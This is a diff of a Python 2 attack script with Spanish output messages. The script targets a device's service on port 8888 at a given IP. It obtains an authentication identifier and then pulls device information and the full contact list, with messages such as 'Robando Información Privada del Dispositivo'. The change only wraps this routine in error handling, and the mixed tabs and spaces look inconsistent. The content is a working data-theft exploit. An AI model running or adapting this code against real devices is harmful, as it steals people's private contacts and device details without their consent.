@@ -56,31 +56,33 @@ if __name__ == '__main__':
 
         accept_me = 'http://' + sys.argv[1] + ':8888/sdctl/comm/lite_auth/'
 
-      	r = s.get(accept_me)
-        r_json = json.loads(r.content)
+	try:
+	      	r = s.get(accept_me)
+	        r_json = json.loads(r.content)
 
-        if r_json["result"] == "la_accept":
-	        print "\nLa conexión ha sido aceptada...\n"
-                print "Robando Información Privada del Dispositivo...\n"
-                time.sleep(2)
+	        if r_json["result"] == "la_accept":
+		        print "\nLa conexión ha sido aceptada...\n"
+	                print "Robando Información Privada del Dispositivo...\n"
+	                time.sleep(2)
 
-                identifier = get_identifier(r_json)
-       	        device_information = 'http://' + sys.argv[1] + ':8888/sdctl/device/overview/?7bb=' + identifier
+	                identifier = get_identifier(r_json)
+	       	        device_information = 'http://' + sys.argv[1] + ':8888/sdctl/device/overview/?7bb=' + identifier
 
-                # Robo de información del dispositivo
-		request_information = s.get(device_information)
-                parse_request_information(request_information)
+	                # Robo de información del dispositivo
+			request_information = s.get(device_information)
+	                parse_request_information(request_information)
 
-                print "\n[*] Dumpeando la agenda de contactos... \n"
-                time.sleep(2)
+	                print "\n[*] Dumpeando la agenda de contactos... \n"
+	                time.sleep(2)
 
-                tn_request = stolen_telephone_numbers(identifier)
-                tn_make_request = s.get(tn_request)
-                parse_tn_request(tn_make_request)
-		os.system('setterm -cursor on')
+	                tn_request = stolen_telephone_numbers(identifier)
+        	        tn_make_request = s.get(tn_request)
+	                parse_tn_request(tn_make_request)
+			os.system('setterm -cursor on')
+			print "\n--------------------------------------------------------"
 
-        else:
-        	print "\nLa conexión ha sido rechazada...\n"
-#        except:
-#        	print "\nError... ¿tal vez la IP no está activa?\n"
-#                sys.exit(0)
+	        else:
+	        	print "\nLa conexión ha sido rechazada...\n"
+        except:
+        	print "\nError... ¿tal vez la IP no está activa?\n"
+                sys.exit(0)
